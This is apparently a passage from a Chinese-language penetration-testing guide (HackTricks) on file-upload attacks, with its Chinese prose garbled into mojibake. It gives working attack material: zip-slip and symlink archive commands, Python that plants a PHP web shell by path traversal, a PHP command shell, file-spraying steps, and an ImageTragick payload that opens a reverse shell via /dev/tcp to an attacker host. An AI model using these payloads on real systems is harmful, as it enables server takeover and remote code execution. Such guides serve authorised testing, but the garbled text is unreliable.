* [svgä¸Šä¼ ä¸­çš„**XXE**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [é€šè¿‡ä¸Šä¼ svgæ–‡ä»¶å®ç°**å¼€æ”¾é‡å®šå‘**](../open-redirect.md#open-redirect-uploading-svg-files)
* ä»[**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)ä¸­å°è¯•**ä¸åŒçš„svgæœ‰æ•ˆè´Ÿè½½**
* [è‘—åçš„**ImageTrick**æ¼æ´](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* å¦‚æœæ‚¨å¯ä»¥**æŒ‡ç¤ºWebæœåŠ¡å™¨ä»URLä¸­è·å–å›¾åƒ**ï¼Œåˆ™å¯ä»¥å°è¯•æ»¥ç”¨[SSRF](../ssrf-server-side-request-forgery/)ã€‚å¦‚æœæ­¤**å›¾åƒ**å°†è¢«**ä¿å­˜**åœ¨æŸä¸ª**å…¬å…±**ç«™ç‚¹ä¸­ï¼Œæ‚¨è¿˜å¯ä»¥æŒ‡ç¤ºURLæ¥è‡ª[https://iplogger.org/invisible/](https://iplogger.org/invisible/)ï¼Œå¹¶**çªƒå–æ¯ä¸ªè®¿é—®è€…çš„ä¿¡æ¯**ã€‚
* [é€šè¿‡PDF-Adobeä¸Šä¼ å®ç°**XXEå’ŒCORS**ç»•è¿‡](pdf-upload-xxe-and-cors-bypass.md)
* ç‰¹åˆ¶çš„PDFæ–‡ä»¶ç”¨äºXSSï¼šä»¥ä¸‹é¡µé¢ä»‹ç»äº†å¦‚ä½•**æ³¨å…¥PDFæ•°æ®ä»¥æ‰§è¡ŒJS**ã€‚å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ PDFæ–‡ä»¶ï¼Œå¯ä»¥æ ¹æ®ç»™å®šçš„æŒ‡ç¤ºå‡†å¤‡ä¸€äº›å°†æ‰§è¡Œä»»æ„JSçš„PDFæ–‡ä»¶ã€‚
* ä¸Šä¼ \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt))å†…å®¹ä»¥æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦æœ‰ä»»ä½•**é˜²ç—…æ¯’è½¯ä»¶**
* æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•ä¸Šä¼ æ–‡ä»¶çš„**å¤§å°é™åˆ¶**

ä»¥ä¸‹æ˜¯æ‚¨å¯ä»¥é€šè¿‡ä¸Šä¼ å®ç°çš„åå¤§äº‹é¡¹çš„æ’åï¼ˆæ¥è‡ª[é“¾æ¥](https://twitter.com/SalahHasoneh1/status/1281274120395685889)ï¼‰ï¼š

1. **ASP / ASPX / PHP5 / PHP / PHP3**ï¼šWebshell / RCE
2. **SVG**ï¼šå­˜å‚¨å‹XSS / SSRF / XXE
3. **GIF**ï¼šå­˜å‚¨å‹XSS / SSRF
4. **CSV**ï¼šCSVæ³¨å…¥
5. **XML**ï¼šXXE
6. **AVI**ï¼šLFI / SSRF
7. **HTML / JS**ï¼šHTMLæ³¨å…¥ / XSS / å¼€æ”¾é‡å®šå‘
8. **PNG / JPEG**ï¼šåƒç´ æ´ªæ°´æ”»å‡»ï¼ˆDoSï¼‰
9. **ZIP**ï¼šé€šè¿‡LFIå®ç°RCE / DoS
10. **PDF / PPTX**ï¼šSSRF / BLIND XXE

#### Burpæ‰©å±•

{% embed url="https://github.com/portswigger/upload-scanner" %}

## é­”æœ¯å¤´å­—èŠ‚

* **PNG**ï¼š`"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**ï¼š`"\xff\xd8\xff"`

æœ‰å…³å…¶ä»–æ–‡ä»¶ç±»å‹ï¼Œè¯·å‚è€ƒ[https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures)ã€‚

### è‡ªåŠ¨è§£å‹ç¼©çš„Zip/Taræ–‡ä»¶ä¸Šä¼ 

å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ å°†åœ¨æœåŠ¡å™¨å†…éƒ¨è§£å‹ç¼©çš„ZIPæ–‡ä»¶ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹ä¸¤ä¸ªæ“ä½œï¼š

#### ç¬¦å·é“¾æ¥

ä¸Šä¼ åŒ…å«æŒ‡å‘å…¶ä»–æ–‡ä»¶çš„ç¬¦å·é“¾æ¥çš„é“¾æ¥ï¼Œç„¶åè®¿é—®è§£å‹ç¼©çš„æ–‡ä»¶ï¼Œæ‚¨å°†è®¿é—®é“¾æ¥çš„æ–‡ä»¶ï¼š
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### åœ¨ä¸åŒçš„æ–‡ä»¶å¤¹ä¸­è§£å‹ç¼©

è§£å‹ç¼©çš„æ–‡ä»¶å°†ä¼šè¢«åˆ›å»ºåœ¨æ„æ–™ä¹‹å¤–çš„æ–‡ä»¶å¤¹ä¸­ã€‚

æœ‰äººå¯èƒ½ä¼šè®¤ä¸ºè¿™ç§è®¾ç½®å¯ä»¥é˜²æ­¢é€šè¿‡æ¶æ„æ–‡ä»¶ä¸Šä¼ è¿›è¡Œæ“ä½œç³»ç»Ÿçº§åˆ«çš„å‘½ä»¤æ‰§è¡Œï¼Œä½†ä¸å¹¸çš„æ˜¯ï¼Œè¿™æ˜¯ä¸æ­£ç¡®çš„ã€‚ç”±äºZIPå­˜æ¡£æ ¼å¼æ”¯æŒåˆ†å±‚å‹ç¼©ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜å¯ä»¥å¼•ç”¨æ›´é«˜çº§åˆ«çš„ç›®å½•ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡æ»¥ç”¨ç›®æ ‡åº”ç”¨ç¨‹åºçš„è§£å‹ç¼©åŠŸèƒ½æ¥é€ƒç¦»å®‰å…¨ä¸Šä¼ ç›®å½•ã€‚

å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªè‡ªåŠ¨åŒ–åˆ©ç”¨ç¨‹åºæ¥åˆ›å»ºè¿™ç§ç±»å‹çš„æ–‡ä»¶ï¼š[**https://github.com/ptoomey3/evilarc**](https://github.com/ptoomey3/evilarc)
```python
python2 evilarc.py -h
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨**evilarcçš„ç¬¦å·é“¾æ¥æŠ€å·§**ï¼Œå¦‚æœæ ‡å¿—ä½äº`/flag.txt`ä¸­ï¼Œè¯·ç¡®ä¿åˆ›å»ºä¸€ä¸ª**æŒ‡å‘è¯¥æ–‡ä»¶çš„ç¬¦å·é“¾æ¥**å¹¶åœ¨æ‚¨çš„ç³»ç»Ÿä¸­**åˆ›å»ºè¯¥æ–‡ä»¶**ï¼Œè¿™æ ·å½“æ‚¨è°ƒç”¨evilarcæ—¶å°±ä¸ä¼šå‡ºé”™ã€‚

ä¸€äº›åˆ›å»ºæ¶æ„zipæ–‡ä»¶çš„Pythonä»£ç ï¼š
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
ä¸ºäº†å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œæˆ‘é‡‡å–äº†ä»¥ä¸‹æ­¥éª¤ï¼š

1. åˆ›å»ºä¸€ä¸ªPHP shellï¼š
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
1. ä½¿ç”¨â€œæ–‡ä»¶å–·æ´’â€æŠ€æœ¯åˆ›å»ºä¸€ä¸ªå‹ç¼©çš„zipæ–‡ä»¶ï¼š
```
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
adding: xxAcmd.php (deflated 40%)
adding: xxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3. ä½¿ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æˆ–viï¼Œå°†â€œxxAâ€æ›´æ”¹ä¸ºâ€œ../â€ï¼Œæˆ‘ä½¿ç”¨viï¼š
```
:set modifiable
:%s/xxA/..\//g
:x!
```
åªå‰©ä¸‹ä¸€æ­¥äº†ï¼šä¸Šä¼ ZIPæ–‡ä»¶å¹¶è®©åº”ç”¨ç¨‹åºè§£å‹ç¼©å®ƒï¼å¦‚æœæˆåŠŸå¹¶ä¸”WebæœåŠ¡å™¨å…·æœ‰è¶³å¤Ÿçš„æƒé™æ¥å†™å…¥ç›®å½•ï¼Œç³»ç»Ÿä¸Šå°†ä¼šæœ‰ä¸€ä¸ªç®€å•çš„æ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œshellï¼š

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**å‚è€ƒ**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

## ImageTragic

å°†æ­¤å†…å®¹ä»¥å›¾åƒæ‰©å±•åä¸Šä¼ ä»¥åˆ©ç”¨æ­¤æ¼æ´ **(ImageMagick, 7.0.1-1)**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## å°†PHP ShellåµŒå…¥PNGå›¾åƒ

å°†Web Shellæ”¾ç½®åœ¨IDATå—ä¸­çš„ä¸»è¦åŸå› æ˜¯å®ƒå¯ä»¥ç»•è¿‡è°ƒæ•´å¤§å°å’Œé‡æ–°é‡‡æ ·æ“ä½œ - PHP-GDåŒ…å«ä¸¤ä¸ªå‡½æ•°æ¥å®ç°è¿™ä¸€ç‚¹[imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php)å’Œ[imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php)ã€‚

é˜…è¯»æ­¤æ–‡ç« ï¼š[https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## å¤šè¯­è¨€æ–‡ä»¶

åœ¨å®‰å…¨ç¯å¢ƒä¸­ï¼Œå¤šè¯­è¨€æ–‡ä»¶æ˜¯æŒ‡å¯ä»¥ä½œä¸ºå¤šç§ä¸åŒæ–‡ä»¶ç±»å‹çš„æœ‰æ•ˆå½¢å¼çš„æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œ[GIFAR](https://en.wikipedia.org/wiki/Gifar)æ—¢æ˜¯GIFæ–‡ä»¶åˆæ˜¯RARæ–‡ä»¶ã€‚è¿˜æœ‰ä¸€äº›æ–‡ä»¶å¯ä»¥åŒæ—¶æ˜¯GIFå’ŒJSï¼ŒPPTå’ŒJSç­‰ã€‚

å¤šè¯­è¨€æ–‡ä»¶é€šå¸¸ç”¨äºç»•è¿‡åŸºäºæ–‡ä»¶ç±»å‹çš„ä¿æŠ¤ã€‚è®¸å¤šå…è®¸ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„åº”ç”¨ç¨‹åºåªå…è®¸ä¸Šä¼ æŸäº›ç±»å‹çš„æ–‡ä»¶ï¼Œä¾‹å¦‚JPEGã€GIFã€DOCï¼Œä»¥é˜²æ­¢ç”¨æˆ·ä¸Šä¼ å¯èƒ½å±é™©çš„æ–‡ä»¶ï¼Œå¦‚JSæ–‡ä»¶ã€PHPæ–‡ä»¶æˆ–Pharæ–‡ä»¶ã€‚

è¿™æœ‰åŠ©äºä¸Šä¼ ç¬¦åˆå¤šç§ä¸åŒæ ¼å¼çš„æ–‡ä»¶ã€‚å®ƒå¯ä»¥å…è®¸æ‚¨ä¸Šä¼ ä¸€ä¸ªåŒæ—¶çœ‹èµ·æ¥åƒJPEGå’ŒPHARæ–‡ä»¶ï¼ˆPHp ARchiveï¼‰çš„æ–‡ä»¶ï¼Œä½†å¯èƒ½ä»ç„¶éœ€è¦ä¸€ä¸ªæœ‰æ•ˆçš„æ‰©å±•åï¼Œå¦‚æœä¸Šä¼ å‡½æ•°ä¸å…è®¸ï¼Œåˆ™æ— æ³•å¸®åŠ©æ‚¨ã€‚

æ›´å¤šä¿¡æ¯è¯·å‚è§ï¼š[https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bugèµé‡‘æç¤º**ï¼š**æ³¨å†Œ**Intigritiï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**Bugèµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬ï¼š[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šå—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTrickså—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTricksè¡£ç‰©**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
